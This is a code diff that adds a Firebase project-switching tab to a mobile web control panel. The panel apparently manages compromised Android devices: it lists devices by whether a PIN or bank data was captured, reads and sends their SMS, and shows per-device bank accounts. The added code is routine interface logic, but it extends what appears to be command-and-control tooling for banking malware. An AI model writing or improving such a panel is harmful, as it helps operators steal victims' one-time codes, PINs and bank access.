@@ -285,10 +285,24 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 
 /* BOTTOM NAV */
 .bottom-nav{flex-shrink:0;height:calc(var(--nav-h) + var(--safe-b));padding-bottom:var(--safe-b);display:flex;background:rgba(8,8,12,0.95);border-top:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(16px)}
-.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;border:none;background:transparent;color:var(--muted);font-size:9px;font-family:'Space Mono',monospace;cursor:pointer;padding:8px 4px}
-.nav-item .ico{font-size:20px;line-height:1}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;border:none;background:transparent;color:var(--muted);font-size:8px;font-family:'Space Mono',monospace;cursor:pointer;padding:8px 2px;min-width:0}
+.nav-item .ico{font-size:18px;line-height:1}
 .nav-item.active{color:var(--accent)}
 .nav-item.active .ico{filter:drop-shadow(0 0 6px var(--accent))}
+
+/* FIREBASE SWITCH TAB */
+.fb-tab-hdr{padding:0 4px 14px}
+.fb-tab-hdr h2{font-size:16px;font-weight:800;margin-bottom:4px}
+.fb-tab-hdr p{font-size:11px;color:var(--muted);line-height:1.4}
+.fb-switch-card{padding:16px;border-radius:16px;background:var(--card);border:1px solid var(--border);margin-bottom:10px;cursor:pointer;transition:border-color .15s,background .15s}
+.fb-switch-card:active{transform:scale(0.99)}
+.fb-switch-card.active{border-color:rgba(255,60,60,0.55);background:rgba(255,60,60,0.08);box-shadow:0 0 16px rgba(255,60,60,0.1)}
+.fb-switch-top{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:6px}
+.fb-switch-name{font-size:15px;font-weight:800}
+.fb-switch-badge{font-size:8px;padding:4px 8px;border-radius:20px;background:rgba(0,255,157,0.12);color:var(--success);font-family:'Space Mono',monospace;white-space:nowrap}
+.fb-switch-badge.offline{background:rgba(107,107,136,0.15);color:var(--muted)}
+.fb-switch-meta{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace}
+.fb-switch-url{font-size:9px;color:var(--muted);margin-top:6px;word-break:break-all;font-family:'Space Mono',monospace;opacity:.75}
 
 /* SHEET */
 .sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:50;opacity:0;pointer-events:none;transition:opacity .25s}
@@ -348,6 +362,14 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
       <div id="devList"></div>
     </section>
 
+    <section class="screen" id="screen-firebase">
+      <div class="fb-tab-hdr">
+        <h2>Firebase Switch</h2>
+        <p id="fbTabSub">Tap a project to view its connections on Home</p>
+      </div>
+      <div id="fbSwitchList"></div>
+    </section>
+
     <section class="screen" id="screen-device">
       <div id="deviceEmpty" class="empty-state"><div class="ico">📱</div>Select a device from Home</div>
       <div id="deviceHero" class="hidden"></div>
@@ -395,6 +417,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 
   <nav class="bottom-nav">
     <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
+    <button class="nav-item" data-tab="firebase" onclick="switchTab('firebase',this)"><span class="ico">🔥</span>Firebase</button>
     <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
     <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
     <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
@@ -429,6 +452,8 @@ var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
 var deviceSmsCache={}, _smsLoadSeq=0;
 var devFilterMode='all', deviceBankCache={};
 var FB_LIST_KEY='rbl_firebase_list';
+var ACTIVE_FB_KEY='rbl_active_fb';
+var activeFbId='';
 var DEVICE_TOGGLE_KEY='rbl_device_toggles';
 var deviceToggleState={};
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
@@ -530,9 +555,87 @@ function deviceHasPin(d){
 }
 function getFilteredDevs(){
   var list=allDevs;
+  if(activeFbId)list=list.filter(function(d){return d.fbId===activeFbId;});
   if(devFilterMode==='pin')list=list.filter(deviceHasPin);
   else if(devFilterMode==='bank')list=list.filter(function(d){return deviceBankCache[d.id]===true;});
   return list;
+}
+function loadActiveFb(){
+  try{
+    var s=localStorage.getItem(ACTIVE_FB_KEY);
+    activeFbId=s||'';
+  }catch(e){activeFbId='';}
+}
+function saveActiveFb(){
+  try{localStorage.setItem(ACTIVE_FB_KEY,activeFbId||'');}catch(e){}
+}
+function ensureActiveFbValid(){
+  if(activeFbId&&!firebaseConfigs.some(function(c){return c.id===activeFbId;}))activeFbId='';
+}
+function getHdrSubText(){
+  var list=getFilteredDevs();
+  if(activeFbId){
+    var inst=getFbInstance(activeFbId);
+    return list.length+' devices · '+(inst?inst.name:'Firebase');
+  }
+  return allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
+}
+function selectFirebase(fbId){
+  activeFbId=fbId||'';
+  saveActiveFb();
+  if(selDev){
+    var d=getSelDev();
+    if(d&&activeFbId&&d.fbId!==activeFbId){
+      selDev='';
+      clearListeners();
+    }
+  }
+  renderFirebaseTab();
+  renderDevices();
+  updateStats();
+  updateFbUi();
+  var label=activeFbId?((getFbInstance(activeFbId)||{}).name||'Firebase'):'All Firebase combined';
+  toast('Switched to '+label,true);
+  switchTab('home',document.querySelector('.nav-item[data-tab="home"]'));
+}
+function bindFirebaseTabEvents(){
+  var el=document.getElementById('fbSwitchList');
+  if(!el||el._rebelFbBound)return;
+  el._rebelFbBound=true;
+  el.addEventListener('click',function(e){
+    var card=e.target.closest('.fb-switch-card');
+    if(!card)return;
+    selectFirebase(card.getAttribute('data-fb-id')||'');
+  });
+}
+function renderFirebaseTab(){
+  var el=document.getElementById('fbSwitchList');
+  if(!el)return;
+  var allOn=allDevs.filter(function(d){return d.status==='online';}).length;
+  var html='<div class="fb-switch-card'+(activeFbId===''?' active':'')+'" data-fb-id="">'+
+    '<div class="fb-switch-top"><div class="fb-switch-name">All Firebase Combined</div>'+
+    (activeFbId===''?'<span class="fb-switch-badge">ACTIVE</span>':'')+'</div>'+
+    '<div class="fb-switch-meta">'+allDevs.length+' devices · '+allOn+' online · '+firebaseConfigs.length+' projects</div></div>';
+  firebaseConfigs.forEach(function(c){
+    var devs=allDevs.filter(function(d){return d.fbId===c.id;});
+    var on=devs.filter(function(d){return d.status==='online';}).length;
+    var inst=getFbInstance(c.id);
+    var schema=inst?(inst.schema||'?'):(c.schema||'?');
+    var host=esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0]);
+    html+='<div class="fb-switch-card'+(activeFbId===c.id?' active':'')+'" data-fb-id="'+escAttr(c.id)+'">'+
+      '<div class="fb-switch-top"><div class="fb-switch-name">'+esc(c.name)+'</div>'+
+      (activeFbId===c.id?'<span class="fb-switch-badge">ACTIVE</span>':(on>0?'<span class="fb-switch-badge">'+on+' ONLINE</span>':'<span class="fb-switch-badge offline">OFFLINE</span>'))+'</div>'+
+      '<div class="fb-switch-meta">'+devs.length+' devices · '+on+' online · '+esc(schema)+'</div>'+
+      '<div class="fb-switch-url">'+host+'</div></div>';
+  });
+  html+='<button type="button" class="btn-add-fb" style="margin-top:12px" onclick="openFbSheet()">+ Add Firebase Project</button>';
+  el.innerHTML=html||'<div class="empty-state"><div class="ico">🔥</div>No Firebase yet<br><span style="font-size:11px;opacity:.6">Add a project below</span></div>';
+  var sub=document.getElementById('fbTabSub');
+  if(sub){
+    sub.textContent=activeFbId
+      ?('Showing '+esc((getFbInstance(activeFbId)||{}).name||'Firebase')+' on Home — tap All to combine again')
+      :('Tap a project to view its connections on Home');
+  }
 }
 function setDevFilter(mode,btn){
   devFilterMode=mode||'all';
@@ -614,6 +717,7 @@ function initFirebaseInstance(cfg){
 }
 function initFirebase(){
   firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
+  ensureActiveFbValid();
   firebaseConfigs.forEach(initFirebaseInstance);
   updateFbUi();
 }
@@ -659,6 +763,7 @@ function removeFirebaseProject(id){
     if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
   });
   if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
+  if(activeFbId===id){activeFbId='';saveActiveFb();}
   firebaseInstances=[];
   firebaseConfigs.forEach(initFirebaseInstance);
   firebaseInstances.forEach(function(inst){attachLive(inst);});
@@ -668,14 +773,17 @@ function removeFirebaseProject(id){
     toast('Project removed',true);
   });
 }
+loadActiveFb();
+ensureActiveFbValid();
 initFirebase();
 
 function updateFbUi(){
-  var total=allDevs.length;
+  var filtered=getFilteredDevs();
   var proj=firebaseConfigs.length;
-  document.getElementById('fbChip').textContent=proj+' FB · '+total+' dev ▾';
+  var chipLabel=activeFbId?((getFbInstance(activeFbId)||{}).name||'Firebase')+' ▾':proj+' FB · '+filtered.length+' dev ▾';
+  document.getElementById('fbChip').textContent=chipLabel;
   document.getElementById('moreFbName').textContent=proj+' projects';
-  document.getElementById('hdrSub').textContent=total+' devices · '+proj+' Firebase combined';
+  document.getElementById('hdrSub').textContent=getHdrSubText();
   var html=firebaseConfigs.map(function(c){
     var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
     return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div>'+
@@ -683,6 +791,7 @@ function updateFbUi(){
       '</div>';
   }).join('');
   document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — add below</div>';
+  renderFirebaseTab();
 }
 function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
@@ -777,7 +886,7 @@ function fetchAllData(){
   firebaseInstances.forEach(attachLive);
   return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
     processClientsData();
-    document.getElementById('hdrSub').textContent=allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
+    document.getElementById('hdrSub').textContent=getHdrSubText();
     if(selDev)loadSmsForDevice();
   });
 }
@@ -1254,6 +1363,7 @@ function switchTab(name,btn){
   if(name==='device')renderDeviceView();
   if(name==='send')updateSendForm();
   if(name==='bank'&&selDev)renderBankAccounts();
+  if(name==='firebase')renderFirebaseTab();
 }
 
 /* APK headers + boot */
@@ -1301,6 +1411,7 @@ function useSelForAutoToken(){
   try{
     panelReady=true;
     bindDevListEvents();
+    bindFirebaseTabEvents();
     loadDeviceToggles();
     fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
     loadAutoTokenState();
